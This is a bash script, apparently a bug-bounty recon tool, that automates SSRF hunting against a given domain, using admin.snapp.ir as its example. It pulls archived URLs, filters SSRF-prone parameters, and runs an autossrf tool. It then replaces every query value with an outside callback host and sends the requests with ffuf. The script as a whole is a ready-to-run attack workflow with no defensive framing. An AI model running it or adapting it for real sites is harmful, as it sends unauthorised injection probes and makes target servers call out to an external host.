if [[ $# -eq 0 ]];
then
    echo "Enter domain target "
    echo "ex: bash ~/script/hunt https://admin.snapp.ir snapp.ir"
    exit 1
fi
url=$1
target=$2
domainPath=`echo "$url" | unfurl domains | sed 's/\./_/g' `

if [ ! -d "~/recon/$target/$domainPath" ];then
        mkdir ~/recon/$target/$domainPath
fi
if [ ! -d "~/recon/$target/$domainPath/Vulnerability" ];then
        mkdir ~/recon/$target/$domainPath/Vulnerability
fi

echo -e "\e[1;32m[+] SSRF ) \e[0m"
rm -rf /tmp/$domainPath-ssrf.txt 
rm -rf /tmp/$domainPath-ssrf-exlpoit.txt

cat ~/recon/$target/$domainPath/Vulnerability/waybackurls.txt | gf ssrf > /tmp/$domainPath-ssrf.txt 
cd /tmp
python3 ~/tools/autossrf/autossrf.py -f $domainPath-ssrf.txt -o $domainPath-ssrf-exlpoit.txt 
cat $domainPath-ssrf-exlpoit.txt > ~/recon/$target/$domainPath/Vulnerability/SSRF.txt
cd -
rm -rf /tmp/$domainPath-ssrf.txt 
rm -rf /tmp/$domainPath-ssrf-exlpoit.txt

cat ~/recon/$target/$domainPath/Vulnerability/waybackurls.txt | grep "=" | qsreplace "https://dalaho00.000webhostapp.com/" >> /tmp/ssrf.txt
ffuf -w /tmp/ssrf.txt -u FUZZ -c 
rm -rf /tmp/ssrf.txt
echo ""
